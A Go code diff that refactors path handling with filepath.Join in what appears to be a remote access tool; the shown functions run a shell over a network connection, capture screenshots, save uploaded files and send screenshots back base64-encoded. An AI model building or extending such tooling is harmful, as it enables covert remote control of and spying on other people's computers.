@@ -19,6 +19,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strings"
 
@@ -83,7 +84,7 @@ func getscreenshot() ([]string, error) {
 			}
 		}
 		fileName := fmt.Sprintf("Scr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
-		fullpath := fpth + fileName
+		fullpath := filepath.Join(fpth, fileName)
 		filenames = append(filenames, fullpath)
 		file, err := os.Create(fullpath)
 		if err != nil {
@@ -102,6 +103,7 @@ func getscreenshot() ([]string, error) {
 func runShell(conn net.Conn) error {
 	defer conn.Close()
 
+	//receiver のパターンと同じにする
 	for {
 		cmdBuff := make([]byte, 1024)
 		n, err := conn.Read(cmdBuff)
@@ -165,7 +167,8 @@ func runShell(conn net.Conn) error {
 
 			//fmt.Println(string(content))
 			//save
-			file, err := os.Create(dir + fileName)
+			src := filepath.Join(dir, fileName)
+			file, err := os.Create(src)
 			if err != nil {
 				log.Println(err)
 				break
@@ -204,8 +207,8 @@ func runShell(conn net.Conn) error {
 					break
 				}
 
-				filepath := strings.Split(fname, "/")
-				fileLastname := filepath[len(filepath)-1]
+				filePath := strings.Split(fname, "/")
+				fileLastname := filePath[len(filePath)-1]
 
 				var content []byte
 				buff := make([]byte, 1024)
@@ -231,7 +234,8 @@ func runShell(conn net.Conn) error {
 				}
 
 				imageToBase64 := base64.StdEncoding.EncodeToString(content)
-				fileinfo := utils.FileInfo{Name: "screenshot/" + fileLastname, Body: []byte(imageToBase64), Size: fstats.Size()}
+				src := filepath.Join("screenshot", fileLastname)
+				fileinfo := utils.FileInfo{Name: src, Body: []byte(imageToBase64), Size: fstats.Size()}
 
 				output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}
 
